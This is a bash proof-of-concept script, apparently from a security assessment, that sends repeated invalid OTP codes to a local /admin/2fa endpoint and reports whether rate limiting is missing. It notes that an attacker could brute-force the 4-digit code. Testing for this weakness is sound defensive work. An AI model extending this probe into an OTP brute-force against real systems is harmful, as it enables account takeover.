#!/bin/bash

# POC: Missing Rate Limiting on 2FA OTP Validation
# This script demonstrates that the /admin/2fa endpoint allows unlimited
# rapid OTP validation attempts without rate limiting

TARGET_URL="http://localhost:5003/admin/2fa"
INVALID_CODE="5555"
NUM_REQUESTS=10

echo "=========================================="
echo "POC: Missing Rate Limiting on 2FA OTP"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Testing $NUM_REQUESTS rapid requests with invalid OTP code: $INVALID_CODE"
echo ""

# Track results
http_200_count=0
http_429_count=0
rate_limit_headers_found=0
responses=()

echo "Sending rapid requests..."
for i in $(seq 1 $NUM_REQUESTS); do
    echo -n "Request $i: "
    
    # Make request and capture full response
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "code=$INVALID_CODE")
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    echo "HTTP $http_code"
    responses+=("$body")
    
    # Count response types
    if [ "$http_code" = "200" ]; then
        ((http_200_count++))
    elif [ "$http_code" = "429" ]; then
        ((http_429_count++))
    fi
done

echo ""
echo "=========================================="
echo "RESULTS:"
echo "=========================================="
echo "Total requests sent: $NUM_REQUESTS"
echo "HTTP 200 responses: $http_200_count"
echo "HTTP 429 (Rate Limited) responses: $http_429_count"
echo ""

# Analyze responses for rate limiting headers
echo "Checking for rate limiting headers in responses:"
for i in $(seq 1 3); do
    echo "Sample response $i:"
    echo "${responses[$((i-1))]}" | grep -i "retry-after\|x-ratelimit\|x-rate-limit" && ((rate_limit_headers_found++)) || echo "  - No rate limiting headers found"
done

echo ""
echo "=========================================="
echo "VULNERABILITY ASSESSMENT:"
echo "=========================================="

if [ "$http_429_count" -eq 0 ] && [ "$http_200_count" -eq "$NUM_REQUESTS" ]; then
    echo "✗ VULNERABLE: No rate limiting detected"
    echo "  - All $NUM_REQUESTS requests succeeded with HTTP 200"
    echo "  - No HTTP 429 responses returned"
    echo "  - No rate limiting headers present"
    echo ""
    echo "An attacker can perform unlimited OTP brute-force attempts."
    echo "For a 4-digit code (10,000 possibilities), brute-forcing would take seconds."
    exit 0  # Success - vulnerability confirmed
else
    echo "✓ PROTECTED: Rate limiting appears to be in place"
    echo "  - HTTP 429 responses detected: $http_429_count"
    exit 1  # Failure - vulnerability not confirmed
fi